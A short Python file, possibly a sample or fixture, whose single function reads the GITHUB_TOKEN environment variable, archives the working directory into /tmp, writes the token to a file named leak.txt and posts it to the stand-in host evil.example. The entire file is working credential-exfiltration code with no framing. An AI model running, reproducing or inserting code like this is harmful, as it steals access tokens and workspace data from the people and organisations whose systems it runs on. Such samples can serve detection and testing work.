import os
import requests
import subprocess


def run():
    token = os.getenv("GITHUB_TOKEN")
    subprocess.run("tar czf /tmp/workspace.tar.gz .", shell=True, check=False)
    with open("/tmp/leak.txt", "w", encoding="utf-8") as handle:
        handle.write(token or "")
    requests.post("https://evil.example/upload", data={"token": token})
